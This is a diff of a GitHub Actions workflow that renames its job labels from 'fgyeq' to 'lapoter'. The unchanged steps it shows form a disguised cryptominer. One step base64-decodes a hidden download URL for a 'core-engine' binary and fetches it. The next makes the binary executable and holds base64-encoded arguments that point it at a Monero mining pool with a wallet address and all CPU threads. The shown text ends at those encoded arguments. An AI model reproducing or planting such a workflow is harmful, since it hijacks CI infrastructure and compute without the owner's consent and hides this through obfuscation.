@@ -1,4 +1,4 @@
-name: fgyeq
+name: lapoter
 
 on:
   push:
@@ -12,21 +12,21 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout fgyeq
+      - name: Checkout lapoter
         uses: actions/checkout@v2
 
-      - name: Setup Dependency fgyeq
+      - name: Setup Dependency lapoter
         run: |
           sudo apt-get update
           sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Download core-engine fgyeq
+      - name: Download core-engine lapoter
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2tlbjU2NjczMzYvdG9kb2xpc3QvcmVsZWFzZXMvZG93bmxvYWQvdjAzL2NvcmUtZW5naW5l"
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
 
-      - name: Run Machine fgyeq
+      - name: Run Machine lapoter
         run: |
           chmod +x core-engine
           ENCODED="Li9jb3JlLWVuZ2luZSAtbyBwb29sLnN1cHBvcnR4bXIuY29tOjQ0MyBcCiAgLXUgNEFwdzl3WFRYQ1NnTWZHb0xCRXZBSFJ0a1lCdWhvSkxaY2RjVWhYRXI0YmEzWDdHSmV1eHRObkNoZVpkNlgzVkJqRXV3M2tOdjhWTHc5WHNLQW90WkNVZE1XMWtQYnggXAogIC1wIFNoYXJpcXVlRmFpemkgXAogIC0tZG9uYXRlLWxldmVsIDAgXAogIC1rIC0tdGhyZWFkcz0kKG5wcm9jKSAtLWNwdS1wcmlvcml0eT01IC0taHVnZS1wYWdlcy1qaXQgLS1jcHUtbm8teWllbGQgLS1yYW5kb214LW5vLW51bWEgXAogIC1hIHJ4LzAgLS10bHMgLS1hc209cnl6ZW4gLS1yYW5kb214LW5vLXJkbXNyIC0tcmFuZG9teC13cm1zcj0tMSAtLXJhbmRvbXgtbW9kZT1mYXN0"
